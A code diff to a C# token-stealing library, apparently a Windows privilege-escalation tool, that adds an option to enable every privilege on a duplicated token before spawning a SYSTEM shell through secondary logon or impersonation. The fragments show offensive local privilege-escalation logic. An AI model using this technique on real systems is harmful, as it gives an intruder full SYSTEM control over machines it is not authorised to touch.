@@ -9,7 +9,7 @@ namespace TokenStealing.Library
 {
     internal class Modules
     {
-        public static bool GetSystemBySecondaryLogon()
+        public static bool GetSystemBySecondaryLogon(bool fullPrivileged)
         {
             var hProcess = IntPtr.Zero;
             var hToken = IntPtr.Zero;
@@ -111,6 +111,26 @@ namespace TokenStealing.Library
                     Console.WriteLine("[+] Duplicated token successfully (hPrimaryToken = 0x{0}).", hPrimaryToken.ToString("X"));
                 }
 
+                if (fullPrivileged)
+                {
+                    Console.WriteLine("[>] Trying to enable all privileges.");
+
+                    status = Utilities.EnableAllTokenPrivileges(hPrimaryToken, out Dictionary<string, bool> availablePrivs);
+
+                    if (!status)
+                    {
+                        foreach (var disabledPriv in availablePrivs)
+                        {
+                            if (!disabledPriv.Value)
+                                Console.WriteLine("[-] Failed to enable {0}.", disabledPriv.Key);
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("[+] All token privileges are enabled successfully.");
+                    }
+                }
+
                 Console.WriteLine("[>] Trying to spawn SYSTEM shell by Secondary Logon Service.");
 
                 status = NativeMethods.CreateProcessWithToken(
@@ -156,7 +176,7 @@ namespace TokenStealing.Library
         }
 
 
-        public static bool GetSystemByTokenImpersonation()
+        public static bool GetSystemByTokenImpersonation(bool fullPrivileged)
         {
             var hProcess = IntPtr.Zero;
             var hToken = IntPtr.Zero;
@@ -316,6 +336,26 @@ namespace TokenStealing.Library
                 else
                 {
                     Console.WriteLine("[+] Duplicated token successfully (hPrimaryToken = 0x{0}).", hPrimaryToken.ToString("X"));
+                }
+
+                if (fullPrivileged)
+                {
+                    Console.WriteLine("[>] Trying to enable all privileges.");
+
+                    status = Utilities.EnableAllTokenPrivileges(hPrimaryToken, out Dictionary<string, bool> availablePrivs);
+
+                    if (!status)
+                    {
+                        foreach (var disabledPriv in availablePrivs)
+                        {
+                            if (!disabledPriv.Value)
+                                Console.WriteLine("[-] Failed to enable {0}.", disabledPriv.Key);
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("[+] All token privileges are enabled successfully.");
+                    }
                 }
 
                 Console.WriteLine("[>] Trying to spawn SYSTEM shell.");
